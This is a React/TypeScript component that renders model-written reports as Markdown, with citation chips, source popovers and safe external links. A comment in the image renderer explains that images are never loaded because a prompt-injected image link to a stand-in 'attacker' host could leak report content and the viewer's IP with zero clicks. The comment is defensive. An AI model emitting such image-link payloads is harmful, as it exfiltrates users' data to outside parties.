"use client";

import { createContext, memo, useCallback, useContext, useEffect, useId, useMemo, useRef, useState, type ReactNode } from "react";
import { createPortal } from "react-dom";
import Markdown, { type Components } from "react-markdown";
import remarkGfm from "remark-gfm";
import type { TaskSource } from "@/lib/api";
import { hueFrom } from "@/lib/utils";
import { citeFromProps, remarkCitations } from "./cites";
import { KIND_LABEL, sourceDomain, sourceInitial } from "./shared";
import s from "./report.module.css";

// ---------- Citation context ----------

interface CiteCtx {
  byN: Map<number, TaskSource>;
  /** Scroll to a source in the Sources panel (absent when there is no panel). */
  jump?: (n: number) => void;
  /** Id prefix of the Sources panel items (`<prefix>-src-<n>`). */
  prefix: string;
}

const CiteContext = createContext<CiteCtx | null>(null);

export function CiteProvider({
  sources,
  jump,
  prefix = "r",
  children,
}: {
  sources: TaskSource[];
  jump?: (n: number) => void;
  prefix?: string;
  children: ReactNode;
}) {
  const value = useMemo<CiteCtx>(() => ({ byN: new Map(sources.map((x) => [x.n, x])), jump, prefix }), [sources, jump, prefix]);
  return <CiteContext.Provider value={value}>{children}</CiteContext.Provider>;
}

/** DOM id of a source row in the Sources panel. */
export const sourceDomId = (prefix: string, n: number) => `${prefix}-src-${n}`;

// ---------- Citation chip with popover ----------

function Cite({ n }: { n: number }) {
  const ctx = useContext(CiteContext);
  const src = ctx?.byN.get(n);
  const ref = useRef<HTMLAnchorElement>(null);
  const [pos, setPos] = useState<{ top: number; left: number; above: boolean } | null>(null);
  const hideTimer = useRef<ReturnType<typeof setTimeout> | null>(null);
  const id = useId();

  const show = useCallback(() => {
    if (hideTimer.current) clearTimeout(hideTimer.current);
    const el = ref.current;
    if (!el || !src) return;
    const r = el.getBoundingClientRect();
    const vw = window.innerWidth;
    const w = Math.min(320, vw - 24);
    const left = Math.max(12, Math.min(r.left + r.width / 2 - w / 2, vw - w - 12));
    const above = r.top > 210;
    setPos({ top: above ? r.top - 8 : r.bottom + 8, left, above });
  }, [src]);

  const hide = useCallback(() => {
    if (hideTimer.current) clearTimeout(hideTimer.current);
    hideTimer.current = setTimeout(() => setPos(null), 60);
  }, []);

  useEffect(() => {
    if (!pos) return;
    const close = () => setPos(null);
    window.addEventListener("scroll", close, { passive: true, capture: true });
    window.addEventListener("resize", close);
    return () => {
      window.removeEventListener("scroll", close, { capture: true });
      window.removeEventListener("resize", close);
    };
  }, [pos]);

  useEffect(() => () => {
    if (hideTimer.current) clearTimeout(hideTimer.current);
  }, []);

  if (!src) {
    return (
      <sup className={s.sup}>
        <span className={`${s.cite} ${s.citeMissing}`}>{n}</span>
      </sup>
    );
  }

  const domain = sourceDomain(src);
  const popId = `cite-${id.replace(/:/g, "")}`;
  const external = !ctx?.jump && src.url && /^https?:\/\//i.test(src.url) ? src.url : null;
  return (
    <sup className={s.sup}>
      <a
        ref={ref}
        href={external ?? `#${sourceDomId(ctx?.prefix ?? "r", n)}`}
        {...(external ? { target: "_blank", rel: "noopener noreferrer" } : {})}
        className={s.cite}
        aria-label={`Source ${n}: ${src.title}`}
        aria-describedby={pos ? popId : undefined}
        aria-expanded={pos ? true : undefined}
        onMouseEnter={show}
        onMouseLeave={hide}
        onFocus={show}
        onBlur={hide}
        onKeyDown={(e) => {
          if (e.key === "Escape") setPos(null);
        }}
        onClick={(e) => {
          if (!ctx?.jump) return;
          e.preventDefault();
          setPos(null);
          ctx.jump(n);
        }}
      >
        {n}
      </a>
      {pos &&
        typeof document !== "undefined" &&
        createPortal(
          <div id={popId} role="tooltip" className={`${s.pop} ${pos.above ? s.popAbove : ""}`} style={{ top: pos.top, left: pos.left }}>
            <div className={s.popHead}>
              <span className={s.badge} style={{ ["--h" as string]: hueFrom(domain || src.title) }} aria-hidden="true">
                {sourceInitial(src)}
              </span>
              <div style={{ minWidth: 0 }}>
                <div className={s.popTitle}>{src.title}</div>
                <div className={s.popMeta}>
                  [{n}] · {domain ? `${domain} · ` : ""}
                  {KIND_LABEL[src.kind] ?? "Source"}
                </div>
              </div>
            </div>
            {src.snippet && <div className={s.popSnippet}>{src.snippet}</div>}
            {ctx?.jump && <div className={s.popHint}>Click to see it in Sources</div>}
          </div>,
          document.body
        )}
    </sup>
  );
}

// ---------- Markdown renderer ----------

const cell = { whiteSpace: "normal", verticalAlign: "top", minWidth: 110 } as const;

const components: Components = {
  table: ({ node: _node, ...props }) => (
    <div className="tw not-prose" style={{ margin: "16px 0" }}>
      <table {...props} />
    </div>
  ),
  th: ({ node: _node, style, ...props }) => <th style={{ ...cell, ...style }} {...props} />,
  td: ({ node: _node, style, ...props }) => <td style={{ ...cell, ...style }} {...props} />,
  a: ({ node: _node, href, ...props }) => (
    <a href={href} {...props} {...(href && /^https?:/i.test(href) ? { target: "_blank", rel: "noopener noreferrer" } : {})} />
  ),
  // Never load images from model output: the browser fetches an image as soon
  // as the report is viewed, so a prompt-injected ![](https://attacker/?d=…)
  // would leak report content (and the viewer's IP) with zero clicks. Show the alt text.
  img: ({ alt }) => (alt ? <span>{alt}</span> : null),
  sup: ({ node, children, ...props }) => {
    const n = citeFromProps(node?.properties);
    if (n !== null) return <Cite n={n} />;
    return <sup {...props}>{children}</sup>;
  },
};

export interface ReportMarkdownProps {
  children: string;
  /** Sources whose numbers become citation chips. */
  sources?: TaskSource[] | null;
  small?: boolean;
  className?: string;
}

/** Report markdown (GFM tables, safe links) with [n] citations turned into chips. */
export const ReportMarkdown = memo(function ReportMarkdown({ children, sources, small, className }: ReportMarkdownProps) {
  const valid = useMemo(() => new Set((sources ?? []).map((x) => x.n)), [sources]);
  const plugins = useMemo(() => [remarkGfm, [remarkCitations, { valid }]] as NonNullable<Parameters<typeof Markdown>[0]["remarkPlugins"]>, [valid]);
  const body = (
    <div className={["prose max-w-none", small && "prose-sm", className].filter(Boolean).join(" ")}>
      <Markdown remarkPlugins={plugins} components={components}>
        {children}
      </Markdown>
    </div>
  );
  return body;
});

/** Wraps ReportMarkdown so citations work even without a surrounding ReportView. */
export function CitedMarkdown({ sources, ...rest }: ReportMarkdownProps) {
  const list = useMemo(() => sources ?? [], [sources]);
  const ctx = useContext(CiteContext);
  if (ctx) return <ReportMarkdown sources={list} {...rest} />;
  return (
    <CiteProvider sources={list}>
      <ReportMarkdown sources={list} {...rest} />
    </CiteProvider>
  );
}
